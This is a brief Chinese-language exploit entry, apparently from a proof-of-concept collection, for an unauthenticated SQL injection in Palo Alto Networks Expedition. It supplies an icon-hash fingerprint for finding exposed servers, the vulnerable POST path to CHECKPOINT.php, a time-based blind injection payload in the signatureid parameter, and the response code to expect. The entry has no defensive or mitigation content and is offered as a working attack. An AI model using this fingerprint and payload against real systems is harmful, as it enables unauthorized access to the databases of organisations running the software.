# PaloAltoNetworksExpedition存在未授权SQL注入漏洞

PaloAltoNetworksExpedition ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="-631559155"`
- **请求**：`POST /bin/configurations/parsers/Checkpoint/CHECKPOINT.php HTTP/1.1`

**Payload**
```
action=import&type=test&project=pandbRBAC&signatureid=1%20AND%20(SELECT%201234%20FROM%20(SELECT(SLEEP(5)))test)
```
- **响应特征**：200